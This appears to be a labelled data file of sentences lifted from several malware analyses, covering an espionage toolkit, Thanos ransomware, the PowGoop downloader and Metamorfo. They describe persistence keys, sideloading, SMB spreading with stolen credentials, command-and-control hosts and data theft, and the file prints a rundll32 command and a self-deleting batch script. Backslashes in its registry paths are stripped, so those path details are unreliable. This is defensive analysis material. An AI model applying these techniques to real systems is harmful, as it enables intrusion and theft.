1	Controls the victims input devices, including the Keyboard and Mouse.
1	By sending keybd_event and mouse_event, it can simulate Keyboard and Mouse operations.
1	The module is created and executed (for the first time) by the module fileputexec.
1	Once the above command action is finished, it sends packets to its C&C server with execution status or the data it collected.
1	Creates encrypted log files: %TMP%smrdprevsmrdprev_%p_%p.tmp, where %p parameters are formatted from the return values of subsequent GetTickCount API calls.
1	Creates event: Globalwsheledstpknt
1	Creates mutex: NtWinWMIctlshed
1	When started, the module initializes its log object with a new filename.
1	Then, it creates one of the following registry values to ensure its automatic start: HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesExplorerRunservise=%path to the modules executable file%, HKCUSoftwareMicrosoftWindowsNTCurrentVersionWindowsload=%path to the modules executable file%
1	Then, the module enters an infinite loop where it executes its main function with 300 second delay between iterations.
1	Any found file with the extension .trh is deleted.
1	They are decrypted using a custom AMPRNG algorithm with a hardcoded key, then decompressed using LZMA.
1	It is written to a temporary file %TMP%%number%.exe and executed with CreateProcess API.
1	The file is removed when the process terminates.
1	It is loaded in memory with a custom PE loader.
1	Then, its export named START is called.
1	The original module is moved to a file with extension .trh and deleted, the tasks contents are written instead.
1	Known variants of the .bak task files were created by the fileputexec module.
1	First, the module tries to raise its privileges.
1	It tries to log in as a privileged user using a dictionary of common passwords.
1	Then, it tries to locate installed Microsoft Office application by enumerating the registry keys in HKLMSOFTWAREMicrosoftWindowsCurrentVersionUninstall and searching for the keys that contain Microsoft Office, Microsoft Office Word, Microsoft Office Shared in the DisplayName value.
1	Then, depending on the values of the options msplugin_Word, msplugin_Excel, msplugin_PowerPoint, it installs a plugin for selected Office applications.
1	For each application, it tries to write the plugin to the first available directory from the list:
1	If the file was created without errors, the module creates the following registry values:
1	After completing the installation, the module sends its log file to the C&C server.
1	When loaded, the module retrieves its resource of type BBB and name AAA, and starts an internal plugin framework.
1	Then, it starts the framework main loop, effectively parsing the resource data and executing the list of actions encoded in the resource.
1	The module retrieves the Adobe Reader installation path by reading the registry value: HKLMSOFTWAREClassesSoftwareAdobeAcrobatExe@default
1	Then, it tries to identify the version of installed software by searching for strings 10.0, 9.0, 8.0 in the installation path.
1	If none of them are found, it aborts installation with error.
1	If installation path contains the string 10.0, the module tries to open the existing registry key: HKCUSOFTWAREAdobeAcrobat Reader10.0
1	If the key exists, then writes Privileged=ON' into its log and sets the following registry key, effectively disabling the protected mode of the Adobe Reader: HKCUSOFTWAREAdobeAcrobat Reader10.0PrivilegedbProtectedMode=0
1	Then, the module extracts the Acrobat Reader plugin body from the configuration option arplugin_loc (specified in the resource) and writes it to: %acrobat reader installation path%plug_ins%arplugin_rem option value%
1	It also retrieves the last write time of the plug_ins directory and sets the plugins last write time to the same value.
1	After completing the installation, the module sends its log file to the C&C server.
1	The data send to the C&C server is compressed with Zlib and encrypted with a modified PKZIP stream cipher, and then it is Base64-encoded.
1	It writes files from its configuration resource to disk and starts a new process from these file(s).
1	When loaded, the module retrieves its resource of type BBB and name AAA, and starts an internal plugin framework.
1	The main function of the module is named task_fileputexec and is registered in the framework.
1	Then, it starts the framework main loop, effectively parsing the resource data and executing the list of actions encoded in the resource.
1	It writes files from its configuration resource to disk
1	It starts executable files specified in the resource
1	First, the module looks for pairs of configuration options called file_rem and file_loc.
1	The module iterates through all file_rem options, reads the corresponding file_loc value and writes the contents of the latter option to disk, using the value of file_rem as a filename.
1	In this case the module tries to log onto that share using credentials specified in an encrypted configuration file that may be located at: %ALLUSERSPROFILE%adt.dat, %LOCALAPPDATA%adt.dat
1	Known variants of the module were used to write another module called scheduler and additional files for this module.
1	After processing all file_rem and file_loc options, the module iterates through all values of the file_exec_rem option.
1	Each value is expected to be an applications path, and each application is executed using the CreateProcess API function.
1	After processing all the configuration options, the module sends its log file to the C&C server.
1	The scanner fetches SNMP agent SysName property and checks if the property is readonly or write-access is available.
1	Then it fetches SNMP SysDescription property.
1	Interestingly, when the module finds a Cisco snmp agent, it starts own TFTP server and transfers Cisco device configuration via TFTP.
1	Next it tries to work with NetBIOS (SMB) protocol of the remote target, the code includes full own implementation of the protocol negotiatiation and communication with the remote host.
1	The module establishes SMB NULL session, which doesnt require authentication and sends further queries.
1	The scanning module connects to LLSRPC pipe, which is used to be available via SMB NULL session on Windows 2000 before SP4.
1	If the attacker connects to Microsoft Windows 2000 Server-based system through a null session, it is possible to use the Llsrpc named pipe to add or to delete licenses, and to create new license groups.
1	It creates a path, part of which includes a unique string ..spider3 which we havent seen previously.
1	It checks remote OS version, locale, SP version, crafts a packet with exploit code and pushes to the target.
1	It injects an executable payload, which drops another module known as Frog (full description of Frog is available in a separate chapter).
1	The main function of the module is named task_msexploit and is registered in the framework.
1	Then, it starts the framework main loop, effectively parsing the resource data and executing the list of actions encoded in the resource.
1	Verified account is used for optional functionality to establish a NetBIOS connection with remote host to change remote registry.
1	It is set to local parameters of system proxy server which were acquired before.
1	Next procedure is to establish a SMB connection with %Target% and check if testsvc_00_name service is running.
1	Then it copies Frog backdoor file embedded in AAA config/script to the remote path %Target%ADMIN$%SYSTEM%testsvc_00.exe.
1	After that it starts the service using Service Control Manager and checks if the Frog backdoor successfully started by querying its status over named pipe %Target%pipenetNtControlListener or via direct TCP connection on port 4444.
1	NamedPipeThread (server mode)
1	This thread creates a named pipe .pipenetNtControlListener (pipe name defined in the AAA config) and waits for incoming connections.
1	TCPThread (server mode)
1	This thread opens a listening TCP port 4444 (port number defined in the AAA config) and waits for incoming connections.
1	CnCThread (client mode)
1	This thread sends a port requests to C&C server URL http://www.new-driver-upgrade.com/cgi-bin/frog (defined in AAA config), containing current system information, including current user name, computer name, local ip address, domain name, system ID and more, gets and interprets a response.
1	The received module is stored on disk in %TEMP%system32uid.%Current Date and Time XORed with 0xA4F2%.tmp and started in a separate process with CreateProcess API.
1	The received module is stored on disk in %TEMP%system32uid.%Current Date and Time XORed with 0xA4F2%.tmp and loaded in current process with LoadLibrary API.
1	The Thanos sample created for these networks executes several layers before the .NET Thanos ransomware runs on a system, specifically using code from several open source frameworks.
1	The layers start at the top with a PowerShell script that not only loads another PowerShell script as a sub-layer, but also attempts to spread the ransomware to other systems on the network using previously stolen credentials.
1	The PowerShell in the second layer does nothing more than load embedded C# code inline so the initial PowerShell script can execute it.
1	The UrbanBishop code is responsible for writing shellcode to a remote process and executing it, of which the shellcode is the final layer before running the Thanos ransomware.
1	The shellcode in this case was created by Donut, which is another open source framework that will generate shellcode that can load and execute .NET assemblies in memory.
1	Spreading to other systems by copying itself to and executing itself on remote systems.
1	The loader functionality within LogicalDuckBill starts with a base64 encoded PowerShell script that it will decode and run using the IEX command.
1	The PowerShell decoded and executed contains the following code, which effectively loads C# code based on UrbanBishop that LogicalDuckBill will call later to inject shellcode:
1	LogicalDuckBill will then check to see if a file named logdb.txt or logdb.txt.locked exists in the c:\ drive before running, which is the method the spreader uses to be sure to only run one instance of the embedded ransomware on each system.
1	We also observed another related sample that looked for logdbnnn.txt instead, which is why we call this script LogicalDuckBill.
1	If these files are not present, LogicalDuckBill will write 1 to this text file and then continue to carry out its functionality.
1	LogicalDuckBill then creates a notepad.exe process, which it will then iterate through running processes to find the process ID (PID) of the created notepad.exe process.
1	With the PID of the notepad process, the PowerShell script calls the Do method in the loaded C# code based on UrbanBishop, which ultimately injects shellcode generated by the Donut framework into the notepad process and executes it.
1	The shellcode then decrypts and loads an embedded .NET executable into memory and executes it, which is the Thanos ransomware payload.
1	The spreader functionality of LogicalDuckBill starts with the script using the Get-NetTCPConnection cmdlet to get the remote addresses of the current TCP connections on the system.
1	For each iteration, the script will use the Test-NetConnection cmdlet to see if the script can connect to each remote system over SMB port tcp/445, and if it can, it uses the net use command to connect to the remote system with previously stolen credentials and mounts the remote systems C: drive to the local systems X: drive.
1	The script then uses the copy command to copy itself to the newly mapped X: drive, which effectively copies LogicalDuckBill to the remote system.
1	The script will then use wmic to run process call create on the remote system to run the newly copied LogicalDuckBill sample on the remote system.
1	However, using the PowerShell script to spread allowed the actors to include previously stolen network credentials when creating the mapped drive and when running the copied PowerShell script using wmic.
1	This variant of Thanos writes a ransom note to a file named HOW_TO_DECYPHER_FILES.txt to the desktop and all of the folders that contained files that Thanos encrypted.
1	The first configuration option enabled that doesn't match the analysis of previous variants of Thanos starts with the code trying to disable User Account Control (UAC) by setting the keys "LocalAccountTokenFilterPolicy" and "EnableLinkedConnections" in SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System to 1.
1	To enumerate the local volumes, the code creates and runs a batch script that is almost exactly the same as the batch script used by Ragnar Locker ransomware to enumerate the local storage volumes.
1	Ragnar Locker used this script to create a VirtualBox configuration file that sets these volumes as SharedFolders, which allows Ragnar Locker to access the local storage volumes while it runs within a VirtualBox virtual machine, as discussed by Sophos.
1	Once the code checks to see if the operating system version is not "Windows 10" or "Windows 8," the code will attempt to open "\\.\PhysicalDrive0" and write a 512-byte string to offset 0.
1	The byte array that is written to offset 0 of "\\.\PhysicalDrive0" initially has a ransom message of "Your files are encrypted.
1	The actors would use the PowGoop downloader to reach out to a remote server to download and execute additional PowerShell scripts.
1	The PowGoop downloader has two components: a DLL loader and a PowerShell-based downloader.
1	The PowGoop loader component is responsible for decrypting and running the PowerShell code that comprises the PowGoop downloader.
1	The PowGoop loader DLL that existed in the same environment as LogicalDuckBill had a filename of goopdate.dll that was likely sideloaded by the legitimate and signed Google Update executable.
1	The sideloading process would start with the legitimate GoogleUpdate.exe file loading a legitimate DLL with a name of goopdate86.dll.
1	The sideloading would occur when the goopdate86.dll library loads the goopdate.dll file, which effectively runs the PowGoop loader.
1	The goopdate.dll files DllEntryPoint function, which would be called if loaded via the sideloading process mentioned above, does nothing more than attempt to run the DllRegisterServer exported function using the following command:
1	rundll32.exe <module filename>,DllRegisterServer
1	The functional code in DllRegisterServer reads a file named config.dat, decodes it and runs it as a PowerShell script, which is the PowGoop downloader component.
1	To decode the config.dat file, the DLL builds and executes a PowerShell script using the CreateProcessA function.
1	The PowerShell script built by the PowGoop loader will read the contents of the config.dat file, base64 decode and decrypt the contents using a simple subtract by two cipher and run the result PowGoop downloader script using the IEX command, as seen in the following:
1	The config.dat file we decrypted is the PowGoop downloader that the actors configured to use the following URL as its command and control (C2): http://107.174.241[.]175:80/index.php
1	The PowGoop downloader will communicate with the C2 server via HTTP GET requests to this URL.
1	It will expect the C2 server to respond to requests with base64 encoded data that the script will decode, decompress the decoded data using System.IO.Compression.GzipStream and then decrypt the decompressed data using the same subtract by two cipher used to decrypt the config.dat file.
1	It will first communicate with the C2 to obtain a unique identifier value that the C2 will assign to the compromised system.
1	After obtaining this identifier, the script will continue to communicate with the C2 to obtain Tasks, which the script will decode, decompress, decrypt and run as PowerShell scripts.
1	The script exfiltrates the result of a task to the C2 by encrypting the result using an add by two cipher, compressing the ciphertext and base64 encoding it, and transmitting it to the C2 server using a GET request with the data in the Cookie field of the HTTP request, specifically as the R value.
1	On execution, the MSI downloader starts by checking to see if it is running in a virtual machine.
1	If not, it downloads a zip file, unzips it, deletes itself, establishes persistency, and restarts the system.
1	The zip file contains the following files:
1	jesus.exe- Signed AVDump32 - Avasts memory dump utility.
1	dbghelp.dll Malicious file to be side-loaded by the renamed jesus.exe.
1	jesus.dmp Payload to be loaded by the injected Windows Media Player executable (wmplayer.exe).
1	Later renamed to the same random name as jesus.exe, but with a .dmp extension.
1	During the rest of the analysis we will refer jesus.exe as "AJWrDz.exe", which is the random name generated in this execution.
1	After the system reboots, the file "AJWrDz.exe" executes, which in turn triggers the side-loading of the malicious (and fake) DLL file dbghelp.dll.
1	This malicious DLL file injects itself into the Windows Media Player process, wmplayer.exe, and reflectively loads the renamed jesus.dmp file, AJWrDz.dmp
1	The attackers abused this feature to add the malicious JavaScript/VBS payload, as shown in Figure 5:
1	The samples in this campaign communicate with a URL in the following format: hxxps://s3-eu-west-1[.]amazonaws[.]com/{random}/image2[.]png.
1	The image2.png file is actually a zip file that is downloaded and extracted to a target folder.
1	In this variant, it is extracted to%APPDATA%\Macromedia.
1	Next, the MSI downloader creates in this location adesktop.txtfile containing the string NULL.
1	The purpose of thedesktop.txtfile is to indicate whether the system is infected by the malware.
1	If it exists, the MSI will exit after it opens Adobes website to explain how to install updates.
1	It does so by executing: c:\Windows\System32\cmd.exe /C start /MAX hxxps://helpx[.]adobe[.]com/br/acrobat/kb/install-updates-reader-acrobat[.]html
1	Otherwise, it will open the legal terms of use page in Adobes site and continue the payload execution.
1	The following command executes to open the terms of use page: c:\Windows\System32\cmd.exe /C start /MAX https://adobe.ly/2RY5GJR which redirects to "hxxps://www[.]adobe[.]com/br/legal/terms.html.
1	The files are extracted to a newly created folder with a randomized name under the same path, and the zip file is then deleted.
1	The AJWrDz.exe executable path is written to the registry Run key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run to achieve persistence.
1	As a final step, the system is restarted to trigger its execution.
1	After the system restart, the AJWrDz.exe file executes.
1	The legitimate use of AvDump32.exe is to create *.dmp files of Avast processes in case there is an unhandled exception.
1	When Avast is installed legitimately on a system, the file is located in its original location: C:\Program Files\AVAST Software\Avast.
1	AvDump32.exe is abused by the Metamorfo to side-load the dbghelp.dll by leveraging the DLL search order.
1	After being side-loaded by AvDump32.exe, the DLLs execution starts with the following steps:
1	Resolves WINAPI functions
1	Hides its GUI usingShowWindowWINAPI call
1	Next, the DLL file creates the mutex[7F4HRE-375E-AEF3-BE9A-OBJT389F53]and writes toHKCU\Software\index(as shown in Figure 9) the name of the running process, which is later used to know the name of the .dmp file that should be loaded.
1	Finally, it injects itself to Windows Media Player executable wmplayer.exe.
1	Metamorfo uses a DLL injection technique with a twist.
1	Then it creates a remote thread that loads the malicious DLL and executes it.
1	Upon injection, the DLL validates that it is running under the wmplayer.exe process by checking the process name, and if so, it goes on to execute its malicious activity.
1	It creates a second mutex,One-InstanceJes, resolves more WINAPI functions, checks for the registry index key (which was previously written), and determines the execution location for the ADWrDz.dmp file.
1	If this file exists, it extracts it in-memory usingRtlDecompressFragmentand reflectively loads it.
1	When it loads, the operating system will disable DEP for the injected wmplayer.exe process.
1	Metamorfo uses this to execute the reflectively loaded payload from a non-executable region.
1	Once ADWrDz.dmp is loaded into memory, Metamorfo leverages theCreateTimerQueueTimerWINAPI call to execute it (as shown in Figure 13).
1	CreateTimerQueueTimeris a WINAPI that creates aqueue for timers.
1	Entering theCreateTimerQueueTimercallback, Metamorfo creates another mutex,libea54, and starts checking for the existence of directories and files relevant for its execution.
1	Since there are multiple variations of Metamorfo in this campaign, the attackers used different locations in the file system to drop their files (see the IOCs section).
1	Next, Metamorfo checks for the existence of mreb.xml and mreboot, as can be seen in Figure 15.
1	If they arent found, it creates another mutex by the name of[7F4HRE-375E-AEF3-BE9A-OBJT389F53].
1	It then checks for an internet connection by trying to resolve goole.com (Misspelled) address.
1	If an internet connection is available, it sends a GET request to https://www.localizaip.com[.]br/api/iplocation.phpto retrieve geo data.
1	Metamorfos C&C communication is encrypted using the dropped OpenSSL libraries libeay32.dll and ssleay32.dll.
1	Based on the gathered data, if the victim is not from Brazil or Portugal it will print the following output and send the collected data to the C&Chxxps[:]//x1-lb12.internal[.]gocache[.]me,which resides in Brazil, and finish.
1	If the malware identifies a file named mreb.xml or a folder named mreboot, it loads a malicious ssleay64.dll, also written in Delphi, and compiled by Borland Delphi, which has the following characteristics:
1	With the help of this trampoline, for everyLoadLibraryWcall the attackers will check if the DLL to be loaded contains one of the following anti-fraud and banking protection strings:
1	If one of them is matched, the DLLLoadLibraryWcall that is trying to load wouldnt load.
1	Known file location: %PROGRAMFILES%WindowsNTiTunesNotifSrv.exe
1	Creates event named sdjvkbasyfvbalvjklas.
1	Writes encrypted log files: %TMP%iTunes_notification_%p.dat, %TMP%iTunes_ddsa_%p.tmp where %p is derives from the result of GetTickCount() API function.
1	When started, the module writes the following registry value to be executed each time Windows starts: HKCUSOFTWAREMicrosoftWindowsCurrentVersionRuniTunes Notification Service=%path to self%
1	Then, it locates the ITunes mobile device DLL and CoreFoundation.dll and resolves the following API functions:
1	If succeeded, the module calls AMDeviceNotificationSubscribe to set up own callback for the iOS device connection/disconnection events.
1	In the Device notification callback function, the module logs each connection and disconnection event.
1	When a device is connected, it starts a new thread that manipulates this device.
1	The module establishes a connection to the device using AMDeviceConnect, AMDeviceIsPaired, AMDeviceValidatePairing and finally, AMDeviceStartSession.
1	Then, it starts the following services on the device: com.apple.afc2, com.apple.afc.
1	The service com.apple.afc2 is usually created when the device was jailbroken, so the module sets up a special flag if the service was started successfully.
1	Then, it opens an Apple File Connection via the started service using AFCConnectionOpen.
1	The module reads device settings using AMDeviceCopyValue.
1	Also, it traverses the whole directory tree and stores the complete file listing in the log.
1	Then, it checks if device is jailbroken by accessing the directory /Applications using AFCFileInfoOpen checking if the service com.apple.afc2 was started
1	The results are written in the log file.
1	Then, it builds a complete directory listing, starting from the root directory or /private/var (sample ee2e21a45a018c6faa68332a32c65ddd only).
1	It also searches and retrieves all files with following extensions: .jpg .jpeg.txt .doc .docx .xls .xlsx .ppt .pptx .dot .dotx .odt .djvu .odts .reg .rtf .zip .rar .pdf .7z .wab .pab .vcf .ost .wav .mp4 .m4a .amr .log .cer .em .msg .arc .key .pgp .gpg
1	Also, it tries to retrieve the contents of the following files: /private/var/mobile/Library/AddressBook/AddressBook.sqlitedb
1	Collected information including iOS device configuration variables, file listings and file contents is written to the file %TMP%iTunes_ddsa_%p.tmp.
1	This file is encrypted and compressed with Zlib.
1	PE Exe file compiled with Microsoft Visual C++ 2008.
1	Creates log file with %TMP%adobe_upd_imhbfex_%p_%p.dat file name where %p depends on a result of GetTickCount() function.
1	It locates (SOFTWAREPC Connectivity SolutionAPI) and loads ConnAPI.dll and DAAPI.dll libraries (exits if unsuccessful and writes to log ERROR LOADING ConnAPI.dll: %d' and EXITING) followed by SUCCESS LOADING ConnAPI.dll: %dn' string written to log file and time stamp.
1	Note: Each event which is written to a log file is followed up with time stamp which is written in a log file prepended by a string in the following format: [%04d-%02d-%02d %02d:%02d:%02d] (year-month-day hour-minute-second).
1	Creates mutex with sysvolumecheckasdfg name and checks if program is already running.
1	If yes, then it writes to log PROGRAM IS ALREADY RUNNING  EXITING & and exits.
1	Creates registry key SOFTWAREMicrosoftWindowsCurrentVersionRunStartup%path_to_file%
1	It resolves the following API functions from ConnAPI.dll:
1	It resolves the following API functions from DAAPI.dll:
1	If succeeded the module calls CONAOpenDM function which opens the device management connection and returns a handle to the device management context.
1	If succeeded a module calls CONARegisterNotifyCallback and to register a callback function for the device list notifications and writes to log I AM WORKING.
1	If device was connected it starts a new thread to get information from the device.
1	The module uses CONARefreshDeviceList, CONASetDeviceListOption, CONAGetDeviceCount, CONAGetDevices and CONAGetDevice API functions to obtain a device which will be manipulated.
1	If a device was connected the module writes to log !!!
1	It calls GetDeviceInfo function to get the following information about the connected device: type, name, software version, used language, synchronization support.
1	A module also gets information about device memory, device model, IMEI number, device file system.
1	Obtained information is written to the log file.
1	SMS and MMS messages are written separately to a log file.
1	The module writes everything to a log file.
1	Extracts all contacts with the following fields: ME, FROMAL_NAME, MIDDLE_NAME, ST_NAME, TITLE, SUFFIX, COMPANY, JOB_TITLE, BIRTHDAY, NICKNAME, GENERAL_NUMBER, HOME_NUMBER, WORK_NUMBER, PREF_NUMBER, R_NUMBER, GER_NUMBER, MOBILE_NUMBER, MOBILE_HOME_NUMBER, MOBILE_WORK_NUMBER, X_NUMBER, X_HOME_NUMBER, X_WORK_NUMBER, VIDEO_CALL_NUMBER, VOIP_NUMBER, VOIP_HOME_NUMBER, VOIP_WORK_NUMBER, POSTAL_ADRESS, BUSINESS_POSTAL_ADRESS, HOME_POSTAL_ADRESS, EMAIL_ADRESS, HOME_EMAIL_ADRESS, WORK_EMAIL_ADRESS, WEB_ADRESS, HOME_WEB_ADRESS, WORK_WEB_ADRESS, PTT_ADRESS, VIDEO_ADRESS, SWISS_ADRESS.
1	Retrieve information about applications which have already been installed on a device.
1	Also monitors if user installs/uninstalls any SIS/SISX/J2ME application.
1	Looks for files from root directory (txt, cdb, doc, docx, xls, xlsx, ppt, pptx, dot, dotx, odt, djvu, odts, reg, rtf, zip, rar, pdf, 7z, wab, pab, vcf, ost, jpg, waw, mp4, m4a, amr, exe, log, cer, eml, msg, arc, key, pgp, gpg) and tries to retrieve them.
1	Creates log file in the following path %%TMP%%tmp_m.%p.%p.dat where all information about the modules work will be written and writes Application starting, version 2.0.0.2, obj: %s.
1	Module uses the same time/date format as in the Nokia module (year-month-date hours-minutes-seconds) after every new log entry.
1	Creates mutex dfgber7t8234ytfndfugh5vndfuvh4.
1	Initialize RAPI.dll and following API functions:
1	After that it checks the ActiveSync version and writes information to a log file.
1	Creates event dfjsbnegisfgsafgdsgcxrte.
1	Deletes ActiveSync Connection Service value in SOFTWAREMicrosoftWindowsCurrentVersionRun.
1	If the module wasnt able to delete this value it creates delex.bat file in TMP folder:
1	del path_to_itself
1	if exist path_to_itself goto Repeat
1	del C:DOCUME~1USER_NAMELOCALS~1Tempdelex.bat
1	And after that launches it.
1	Module uses WaitForSingleObject API function and waits for a device to be connected.
1	If device is connected then it writes Device connected to a log file and calls a subroutine which initializes a connection and gets information like devices name, OS version, CLSID which is written to a log file.
1	The module also checks the associations (in a registry of a device) between certain file types and applications for these file types on a device and writes this information to a log file:
1	First the module tries to inject an XML provisioning document on a device.
1	Loads the provisioning doc on a device:
1	NB: all injected modules below are copied to Windows directory on a Windows Mobile device.
1	If XML provisioning doc was injected successfully the module tries to install the so-called Zakladka module with winupdate.dll name.
1	After Zakladka, the module injects the winupdate.cab file, which is a provisioning XML file in archive with a certificate inside.
1	After winupdate.cab module injects the winupdate.cfg file, which is a configuration file that contains mobile country codes with mobile network codes.
1	After winupdate.cfg the module injects calc.exe file, an application for removing other modules from Windows Mobile device.
1	The module then creates backup file Windowswinupdate.dat with zakladka and other Windows Mobile modules inside.
1	The backup file is encrypted with RC4 and q12ioptyhednv347 key.
1	The module creates WinUpdate.exe (Windows folder, zakladka inside) and WinUpdate.lnk (WindowsStartUp folder).
1	After calc.exe the module injects consequentially word.exe, excel.exe, ppoint.exe, pdf_viewer.exe, wmplauer.exe, img.exe, iexplorer.exe, wceloader.exe modules and changes file associations on the device.
1	all Word files and other text documents will be opened with word.exe, all images will be opened with img.exe, etc.
1	File pdf_viewer.exe is an application for launching other Windows Mobile modules.
1	After that it tries to launch pdf_viewer.exe on a Windows Mobile device using CeCreateProcess API function from rapi.dll library.
1	Creates mutex dfgbsdfjvabufqgwiffuvh4.
1	Creates log file %%TMP%%tmp_mu.%p.%p.dat and writes to a log file, Updater started, Version 1.0.0.0 s. The module uses the same time/date format as in the Nokia module (year-month-date hours-minutes-seconds) after every new log entry.
1	Opens event dfjsbnegisfgsafgdsgcxrte.
1	Initializes RAPI.dll and following API functions:
1	Creates thread dfjssdfgsdffgdsgcxrte and delex.bat file in TMP folder (for deleting itself if the mutex hasnt been created or after it finished its work):
1	if exist path_to_itself goto Repeat
1	del C:DOCUME~1USER_NAMELOCALS~1Tempdelex.bat
1	This module uses the WaitForSingleObject API function and waits for a device to be connected.
1	If a device is connected then it writes Device connected to a log file and calls a subroutine which initializes a connection and gets information like the devices name, OS version, CLSID, all of which is written to a log file.
1	Injects Update.exe file to Windows directory with Update.exe name.
1	After that it tries to launch a file on a Windows Mobile device using CeCreateProcess API function from rapi.dll library.
1	PE Exe file compiled with Microsoft Visual C++ 2005
1	Creates log file Temptmp%p.dat.
1	Module loads XML provisioning doc (see above in Windows Mobile module for Windows).
1	Module obtains MCC (Mobile Country Code) and MNC (Mobile Network Code) from winupdate.cfg file of infected device and writes this information to a log file.
1	Module tries to send in a C&C interaction loop a POST request to win-check-update.com (if that domain is unavailable, it sends a request to mobile-update.com): POST %s HTTP/1.0 Accept: */* User-Agent: Mozilla/4.0 Content-Length: %d Host: %s
1	As a response from a remote server, the module receives a file which is stored in Windows%u.exe file and executed.
1	Creates process MobileCalculator.exe.
1	Decrypts file WindowsWinUpdate.dat with q12ioptyhednv347 key.
1	Deletes files word.exe, excel.exe, ppoint.exe, img.exe, wmplauer.exe, iexplorer.exe, wceloader.exe, pdf_viewer.exe, WinUpdate.exe, from Windows directory.
1	Retrieves type and data from SystemExplorerShell FoldersStartUp registry key.
1	Deletes WinUpdate.lnk file.
1	All files are compiled with PE Exe file compiled with Microsoft Visual C++ 2005.
1	After launch, the module tries to configure device with an XML provisioning document.
1	All the values and fields in this XML (it is stored inside file) are the same as in Windows Mobile module for Windows.
1	After that it launches a Windows Mobile application wceload.exe (CAB installer) on a file winupdate.cab (previously uploaded to the device by Windows module to Windows directory) with /silent /noui.
1	Creates a registry key ServicesWindows Update and registers file Windowswinupdate.dll as a service using the RegisterService API function (launches it).
1	Launches calc.exe (Remover) file from Windows directory.
1	After that it launches legitimate applications (like pword.exe, pxl.exe, iexplore1.exe or others) which are associated with certain file types.
1	Updater component
1	File name: Update.exe
1	PE Exe file compiled with Microsoft Visual C++ 2005.
1	Module launches a Windows Mobile application wceload.exe (CAB installer) on a file Windowscert.cab with /silent /noui.
1	When loaded, the module retrieves its resource of type BBB and name AAA, and starts an internal plugin framework.
1	The main function of the module is named task_wnftpscan and is registered in the framework.
1	Then, it starts the framework main loop, effectively parsing the resource data and executing the list of actions encoded in the resource.
1	It uses PCRE library to check if remote file extensions.
1	Config option ftp_getlist=1 makes the code log every directory listing.
1	If it was set to 1 in the config, then the module would try to create tmp subdirectory in every remote directory it goes in.
1	When writing to the in-memory logs the module prints a banner FtpClient V4.0, which is probably an alternative name for the module or the code was reused from some other project.
1	In the end of work it adds WMFTPSCAN END to the log.
1	After collecting logs and fetching files in memory, the module compiles all data together, compresses using Zlib methods, encrypts, encodes with Base64 and uploads to one of the command and control servers specified in the config.
1	This module doesnt change registry, nor does it created any local files.
1	After completing FTP directory scanning and file retrieval, the module sends logs and collected files to the C&C server.
1	The data send to the C&C server is compressed with Zlib and encrypted with a modified PKZIP stream cipher, and then it is Base64-encoded.
1	When loaded, the module deletes the file named dump, then proceeds to its main function.
1	After executing the main function, the module tries to delete the same file again.
1	First, the module initializes its main object and log headers, i.e.
1	Then, it retrieves its resource of type AAA and name BBB.
1	The resource is expected to be an INI file compressed using Zlib.
1	The module decompresses the data and parses the whole INI file.
1	It extracts data from the following INI sections:
1	Extract data from all files with dbx extension (Outlook Express mail archives)
1	Extract data from all files with tbb extension (The Bat mail archives)
1	Extract data from all Thunderbird mail archives
1	Traverse all fixed and network disks
1	Traverse system network shares
1	Traverse computers network shares
1	Global limit on the data to be sent to the C&C server
1	Save last traversal time value and modify minimum file time 
1	After parsing the INI file, the module tries to raise its privileges by logging on as a user with administrative rights.
1	The module sends several types of packets to the C&C server.
1	The first packet is sent after the configuration is read, it contains the string === and starts with a string Subject: Reflebt
1	Intermediate packets are sent when every traversal operation is finished, it also contains the contents of the internal log file and starts with a string Subject: Refleut
1	Contents of the stolen files are sent in separate packets, they are split in chunks of size 511950 bytes (regular files) or 512000 (e-mails) bytes, starting with a string Subject: Refleut
1	The final packet is sent after all operations are completed, it contains a string === and starts with a string Subject: Refleet.
1	The data sent to the C&C server is compressed with Zlib and encrypted with a modified PKZIP stream cipher, and then it is Base64-encoded.
1	For each i_get_file configuration section, the module traverses the directories named in f_search_path values of the same section.
1	If the i_getfile_all_disks global option is set, the module traverses all fixed and mounted network drives.
1	If the i_getfile_all_netdisks global option is set, the module searches for available network shares and tries to mount %computer%%drive%$ system shares for drive names from C to F, then traverses these shares.
1	If the i_getfile_all_netshared global option is set, the module searches for all available network shares and traverses them.
1	The directories are traversed recursively, with a hardcoded depth limit of 100.
1	The global option spec_check_task_existance_a modifies the traversal and matching rules for local and network disks.
1	If this option is set, the module tracks the time of the last traversal of each disk in a file named %DRIVE%System RestoreSystem Restore Point.
1	This file is then used to correct the minimum file creation/modification rules so that the module skips the files that it should have already processed.
1	The module applies the same matching routine to all files found while traversing the disks, folders and network shares.
1	For each file, the module checks if the files creation and modification time satisfy both minimum and maximum configuration values, its size is within the allowed range and the filename is matched by at least one f_regexp_a regular expression and is not matched against any f_regexp_d regular expression.
1	If the files properties satisfy all the requirements, the file is sent to the C&C server.
1	The module can parse Outlook Express databases (dbx files), The Bat databases (tbb files) and Thunderbird message storages.
1	Depending on the configuration options, these files may be read, processed and then extracted e-mail messages are sent to the C&C server.
1	After all operations are completed, the module sends the final C&C request with string Subject: Refleet and returns.
1	It is stored on disk as an encrypted file that is loaded by the Scheduler module.
1	Creates encrypted log files: %TMP%smrdprevsmrdprev_%p_%p.tmp, where %p parameters are formatted from the return values of subsequent GetTickCount API calls.
1	Creates encrypted storage files: %TEMP%%08 hex digits%hst, where 8 hex digits represent the CRC32 checksum of the current users name.
1	Creates mutex: Win32Wbem32Prefetchfamt
1	When started, the module initializes its log object with a new filename using a format string %TMP%smrdprevsmrdprev_%p_%p.tmp, and sets the log header:
1	Then, it creates four data collection and directory traversal objects and loads the configuration INI file.
1	The configuration file is loaded from the resource of type BBB, name AAA and is decrypted using a custom AMPRNG cipher with a hardcoded key.
1	Extract data from all files with dbx extension (Outlook Express mail archives)
1	Extract data from all files with tbb extension (The Bat mail archives)
1	Extract data from all Thunderbird mail archives
1	Traverse all fixed and network disks
1	Traverse system network shares
1	Traverse computers network shares
1	Global limit on the data to be sent to the C&C server
1	Store MD5 hashes of files and e-mails that were already processed, skip already processed items
1	Save last traversal time value and modify minimum file time option depending that value
1	Delete the file after sending its contents to the C&C server
1	Then, the module starts four threads and assigns each traversal object to a thread.
1	If f_use_hash_storage option is turned on, the module creates a binary hash storage in a file named %TEMP%%08 hex digits%hst, where 8 hex digits represent the CRC32 checksum of the current users name.
1	It populates that storage with information about every processed file, including file size, creation date and MD5 hash of files name.
